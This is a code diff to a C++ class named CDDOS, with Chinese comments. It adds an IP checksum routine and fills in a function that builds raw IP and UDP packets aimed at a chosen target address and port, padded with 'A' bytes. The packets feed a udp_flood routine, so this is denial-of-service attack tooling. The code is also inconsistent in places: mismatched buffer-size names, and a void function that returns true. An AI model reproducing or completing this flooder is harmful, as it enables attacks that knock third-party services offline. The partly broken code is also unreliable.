@@ -12,7 +12,38 @@ CDDOS::CDDOS()		//构造函数
 {
 
 }
-void CDDOS::fill_udp_buffer()
+unsigned short ComputeCheckSum(unsigned short *buffer, int size)
+{
+	/*
+    IP首部校验和的计算主要是两步：按位异或和取反，具体来说
+	1. IP头部以16位为一个单位，逐个模2加（相当于异或）；
+	2. 得到的结果取反，作为校验和放入校验和字段；
+	3. 初始计算校验和字段时该字段全部用0填充；
+    以上是对于发送者来说如何计算校验和的，而对于接收者来说，验证也很简单：
+	1. 对于接收的IP报文头部以16位为单位逐个求和；
+	2. 若结果为1，则校验正确，否则出错丢弃；
+    原理很简单，接收方的计算对象是A和A的反的异或，结果当然是1了！
+
+*/
+      unsigned long cksum = 0;
+      while(size>1)
+      {
+		  unsigned short num = htons(*buffer++);
+		  cksum += num;
+          size -= sizeof(USHORT);
+      }
+        if(size)
+        {
+			unsigned char temp = (*(UCHAR*)buffer); 
+			unsigned short num = temp<<8;
+            cksum += num;
+        }
+        cksum = (cksum>>16) + (cksum&0xffff);
+        //return (USHORT)(~cksum);
+		//cksum = 0xffff - cksum;
+		return htons((USHORT)(~cksum));
+}
+void CDDOS::fill_udp_buffer(char *szDstIp,unsigned short dPort)
 {
 /************************************************************************/
 /*          填充UDP缓冲区                                                            */
@@ -39,8 +70,73 @@ void CDDOS::fill_udp_buffer()
 	UDP_HEADER udpHeader;		//UDP头
 	int iUdpCheckSumSize;
 	char *ptr = NULL;
-	FillMemory(pBuffer,nBufferSize,'A');		//将pBuffer填充为A
-	iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + nBufferSize;
+	FillMemory(pBuffer,BufferSize,'A');		//将pBuffer填充为A
+	iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + BufferSize;		//IP数据报的长度
+
+	//填充IP首部
+	//填充IP头
+	ipHeader.ver_ihl = (4<<4) | (sizeof(ipHeader)/sizeof(unsigned long));    //版本，IP首部长度
+	ipHeader.tos = 0;       //区分服务
+	ipHeader.tlen = htons(iTotalSize);   //总长度
+	ipHeader.identification = 0;    //标识，任意数值
+	ipHeader.flags_of = 0;    // 标志 片偏移
+	ipHeader.ttl =128;  //生存时间
+	ipHeader.proto = IPPROTO_UDP;  //协议
+	ipHeader.saddr = *(IP_ADDRESS *)&saddr;  //源ip地址
+	unsigned long ip = inet_addr(szDstIp);
+	ipHeader.daddr = *(IP_ADDRESS *)&ip;   //目标Ip地址
+	ipHeader.crc = 0;    
+
+	//计算ip校验和
+	ipHeader.crc = ComputeCheckSum((unsigned short *)&ipHeader,sizeof(ipHeader));    //首部校验和
+
+	//填充UDP头部
+	udpHeader.sport = htons(5444);   //本机端口
+	udpHeader.dport = htons(dPort);  //目标端口
+	udpHeader.len = htons( sizeof(udpHeader) + BUFFERSIZE);    //标明UDP头部和UDP数据的总长度字节。
+	udpHeader.crc = 0;
+
+	//在进行TCP校验和的计算时，需要增加一个TCP伪首部的校验和
+	ZeroMemory(g_szSendBuffer,BUFFERSIZE +60);
+	ptr  = g_szSendBuffer;
+
+	//源ip地址
+	iUdpCheckSumSize = 0;
+	memcpy(ptr,&ipHeader.saddr,sizeof(ipHeader.saddr));  
+	ptr += sizeof(ipHeader.saddr);
+	iUdpCheckSumSize += sizeof(ipHeader.saddr);
+
+	//目的ip地址
+	memcpy(ptr,&ipHeader.daddr,sizeof(ipHeader.daddr));  
+	ptr += sizeof(ipHeader.daddr);
+	iUdpCheckSumSize += sizeof(ipHeader.daddr);
+
+	//一个字节空字符
+	ptr++;
+	iUdpCheckSumSize++;
+
+	//协议
+	memcpy(ptr,&ipHeader.proto,sizeof(ipHeader.proto));  
+	ptr += sizeof(ipHeader.proto);
+	iUdpCheckSumSize += sizeof(ipHeader.proto);
+
+	//udp长度
+	memcpy(ptr,&udpHeader.len,sizeof(udpHeader.len));  
+	ptr += sizeof(udpHeader.len);
+	iUdpCheckSumSize += sizeof(udpHeader.len);
+
+	//udp数据区
+	memcpy(ptr,szBuffer,BUFFERSIZE);
+	iUdpCheckSumSize += BUFFERSIZE;
+
+	//计算校验和
+	udpHeader.crc = ComputeCheckSum((unsigned short*)g_szSendBuffer,iUdpCheckSumSize);
+
+	//填充发送缓冲区
+	memcpy(g_szSendBuffer,&ipHeader,sizeof(ipHeader));
+	memcpy(g_szSendBuffer+sizeof(ipHeader),&udpHeader,sizeof(udpHeader));
+	memcpy(g_szSendBuffer+sizeof(ipHeader)+sizeof(udpHeader),&szBuffer,BUFFERSIZE);
+	return  true;
 }
 void CDDOS::udp_flood()
 {
